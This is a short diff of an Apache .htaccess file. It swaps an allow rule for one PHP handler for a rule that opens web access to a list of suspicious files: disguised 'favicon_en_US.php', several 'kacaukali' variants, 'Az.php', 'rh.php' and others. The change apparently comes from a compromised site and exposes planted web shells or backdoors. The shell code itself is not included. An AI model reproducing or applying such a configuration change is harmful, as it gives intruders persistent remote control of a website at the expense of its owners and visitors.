@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(ManagerHandler.php)$">
+<FilesMatch "^(favicon_en_US.php|kacaukali-MAR.shtml|kacaukali-MAR.php82|kacaukali.php|kacaukali.php82|autoload_real.php|Az.php|Ge.php|table.php|login.php|rh.php|js.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
